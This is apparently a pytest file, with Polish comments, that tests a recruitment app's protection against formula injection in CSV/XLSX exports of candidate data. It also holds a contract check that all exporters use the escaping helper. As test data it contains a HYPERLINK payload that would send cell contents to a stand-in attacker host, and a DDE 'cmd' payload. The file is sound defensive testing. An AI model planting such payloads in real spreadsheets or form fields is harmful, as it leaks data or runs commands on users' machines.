"""Eksporty CSV/XLSX nie mogą zamienić tekstu użytkownika w formułę.

Imię, nazwisko i lokalizacja kandydata przychodzą także z ANONIMOWEGO
formularza strony kariery. ``=HYPERLINK("https://zly.example/?"&A1, "CV")``
w polu „imię” był w eksporcie kandydatów zapisywany wprost: openpyxl traktuje
napis zaczynający się od ``=`` jako formułę, a Excel otwierający CSV robi to
samo z ``=``, ``+``, ``-`` i ``@``. Jedna reguła: ``app.core.export_safety``.
"""

from __future__ import annotations

import ast
import csv
import io
import uuid
from datetime import date, datetime, timezone
from decimal import Decimal
from pathlib import Path

import pytest
from httpx import AsyncClient
from openpyxl import load_workbook
from sqlalchemy import delete

from app.core.export_safety import FORMULA_PREFIXES, safe_cell, safe_row

APP_DIR = Path(__file__).resolve().parents[1] / "app"
PAYLOAD = '=HYPERLINK("https://zly.example/?"&A1,"CV")'


# ── safe_cell ────────────────────────────────────────────────────────────────


@pytest.mark.parametrize("prefix", FORMULA_PREFIXES)
def test_safe_cell_prefixes_every_formula_trigger(prefix):
    value = f"{prefix}cmd|' /C calc'!A0"
    assert safe_cell(value) == "'" + value


@pytest.mark.parametrize(
    "value",
    ["Jan", "Kowalska-Nowak", "", " =ze spacją", "a=b", "100 zł"],
)
def test_safe_cell_leaves_plain_text_alone(value):
    assert safe_cell(value) == value


@pytest.mark.parametrize(
    "value",
    [None, 0, -5, 12.5, Decimal("-1.50"), date(2026, 9, 25), True],
)
def test_safe_cell_keeps_numbers_and_dates_as_they_are(value):
    """Liczby i daty zostają typami — arkusz ma je sortować i sumować."""
    assert safe_cell(value) is value


@pytest.mark.parametrize(
    "value", ["+48 600 100 200", "-1 200,50", "+48 (22) 123-45-67"]
)
def test_safe_cell_leaves_phone_and_amount_text_alone(value):
    """Same cyfry i separatory nie są formułą z funkcją ani linkiem."""
    assert safe_cell(value) == value


@pytest.mark.parametrize("value", ["+1+1", "-2+3*A1", "+cmd", "-", "=48"])
def test_safe_cell_still_prefixes_arithmetic_and_text(value):
    assert safe_cell(value) == "'" + value


def test_safe_row_protects_each_cell():
    assert safe_row([1, "=1+1", "Jan", None]) == [1, "'=1+1", "Jan", None]


# ── eksport kandydatów ───────────────────────────────────────────────────────


def _candidate(**overrides):
    from app.models.candidate import Candidate, CandidateStatus

    fields = dict(
        id=987654,
        name=PAYLOAD,
        lastname="@SUM(1+1)",
        email="kandydat@example.com",
        phone="+48 600 100 200",
        location="-2+3",
        status=CandidateStatus.active,
        source="career_page",
        created_at=datetime(2026, 9, 25, tzinfo=timezone.utc),
    )
    fields.update(overrides)
    return Candidate(**fields)


def test_candidate_export_row_escapes_user_text():
    from app.api.candidates import _EXPORT_COLUMNS, _row_for_export

    row = dict(zip(_EXPORT_COLUMNS, _row_for_export(_candidate())))
    assert row["id"] == 987654
    assert row["name"] == "'" + PAYLOAD
    assert row["lastname"] == "'@SUM(1+1)"
    # Telefon to same cyfry — nie wywoła funkcji, więc zostaje bez apostrofu.
    assert row["phone"] == "+48 600 100 200"
    assert row["location"] == "'-2+3"
    assert row["email"] == "kandydat@example.com"


def test_candidate_xlsx_stores_the_payload_as_text_not_formula():
    from app.api.candidates import _build_xlsx_bytes, _row_for_export

    buffer = _build_xlsx_bytes([_row_for_export(_candidate())])
    sheet = load_workbook(buffer).active
    name_cell = sheet.cell(row=2, column=2)
    assert name_cell.data_type == "s"
    assert name_cell.value == "'" + PAYLOAD
    # Identyfikator zostaje liczbą.
    assert sheet.cell(row=2, column=1).value == 987654


def test_legacy_import_export_csv_escapes_user_text():
    from app.api.import_export import _build_candidates_csv

    text = _build_candidates_csv([_candidate()]).decode("utf-8-sig")
    rows = list(csv.reader(io.StringIO(text)))
    assert rows[1][1] == "'" + PAYLOAD
    assert rows[1][2] == "'@SUM(1+1)"


@pytest.mark.asyncio
async def test_candidate_export_endpoint_neutralises_formula_in_name(
    app_client: AsyncClient, app_auth_headers: dict
):
    """Cała ścieżka: kandydat z formularza kariery → POST /api/candidates/export."""
    from app.core.database import AsyncSessionLocal
    from app.models.candidate import Candidate, CandidateStatus

    marker = uuid.uuid4().hex[:10]
    async with AsyncSessionLocal() as db:
        candidate = Candidate(
            name=PAYLOAD,
            lastname=f"Formula{marker}",
            email=f"formula-{marker}@example.com",
            status=CandidateStatus.active,
        )
        db.add(candidate)
        await db.commit()
        candidate_id = candidate.id
    try:
        payload = {
            "scope": "selected",
            "filters": {},
            "candidate_ids": [candidate_id],
            "limit": 10,
        }
        xlsx = await app_client.post(
            "/api/candidates/export",
            json={**payload, "format": "xlsx"},
            headers=app_auth_headers,
        )
        assert xlsx.status_code == 200, xlsx.text
        sheet = load_workbook(io.BytesIO(xlsx.content)).active
        cell = sheet.cell(row=2, column=2)
        assert cell.data_type == "s"
        assert cell.value == "'" + PAYLOAD

        csv_response = await app_client.post(
            "/api/candidates/export",
            json={**payload, "format": "csv"},
            headers=app_auth_headers,
        )
        assert csv_response.status_code == 200, csv_response.text
        rows = list(csv.DictReader(io.StringIO(csv_response.text)))
        assert rows[0]["name"] == "'" + PAYLOAD
    finally:
        async with AsyncSessionLocal() as db:
            await db.execute(delete(Candidate).where(Candidate.id == candidate_id))
            await db.commit()


# ── kontrakt: każdy moduł eksportujący woła safe_cell ────────────────────────

# Moduły budujące CSV/XLSX, które ŚWIADOMIE nie wołają safe_cell — z powodem.
# Nowy wpis tylko wtedy, gdy plik nie niesie tekstu od ludzi.
_EXEMPT: dict[str, str] = {}

_WRITER_CALLS = {("csv", "writer"), ("csv", "DictWriter")}


def _is_writer_call(node: ast.Call) -> bool:
    func = node.func
    if isinstance(func, ast.Name) and func.id == "Workbook":
        return True
    if isinstance(func, ast.Attribute):
        if func.attr == "Workbook":
            return True
        if isinstance(func.value, ast.Name):
            return (func.value.id, func.attr) in _WRITER_CALLS
    return False


def _imports_export_safety(tree: ast.AST) -> bool:
    for node in ast.walk(tree):
        if isinstance(node, ast.ImportFrom) and node.module == "app.core.export_safety":
            names = {alias.name for alias in node.names}
            if names & {"safe_cell", "safe_row"}:
                return True
    return False


def _exporting_modules() -> dict[str, ast.AST]:
    found: dict[str, ast.AST] = {}
    for path in sorted(APP_DIR.rglob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        if any(
            isinstance(node, ast.Call) and _is_writer_call(node)
            for node in ast.walk(tree)
        ):
            found[path.relative_to(APP_DIR.parent).as_posix()] = tree
    return found


def test_contract_finds_the_known_exporters():
    """Detektor sam musi coś znajdować — inaczej test poniżej jest pusty."""
    modules = _exporting_modules()
    for expected in (
        "app/api/candidates.py",
        "app/api/import_export.py",
        "app/api/client_directory.py",
        "app/api/dl_alerts.py",
        "app/api/b2b_contract_generator.py",
        "app/api/contracts.py",
        "app/services/order_excel_export.py",
    ):
        assert expected in modules


def test_every_csv_or_xlsx_exporter_uses_safe_cell():
    missing = [
        module
        for module, tree in _exporting_modules().items()
        if module not in _EXEMPT and not _imports_export_safety(tree)
    ]
    assert not missing, (
        "Moduły budujące CSV/XLSX bez ochrony przed formułą (użyj "
        "app.core.export_safety.safe_cell / safe_row albo dopisz wyjątek "
        f"z powodem do _EXEMPT): {missing}"
    )


def test_no_private_copy_of_the_formula_prefix_list():
    """Druga kopia listy prefiksów rozjeżdża się przy pierwszej poprawce
    (tak było: trzy moduły znały \\t i \\r, dwa nie)."""
    copies: list[str] = []
    for path in sorted(APP_DIR.rglob("*.py")):
        if path.name == "export_safety.py":
            continue
        tree = ast.parse(path.read_text(encoding="utf-8"))
        for node in ast.walk(tree):
            if isinstance(node, ast.Tuple):
                values = {
                    element.value
                    for element in node.elts
                    if isinstance(element, ast.Constant)
                    and isinstance(element.value, str)
                }
                if {"=", "+", "-", "@"} <= values:
                    copies.append(f"{path.relative_to(APP_DIR.parent)}:{node.lineno}")
    assert not copies, f"Lokalna kopia prefiksów formuły: {copies}"
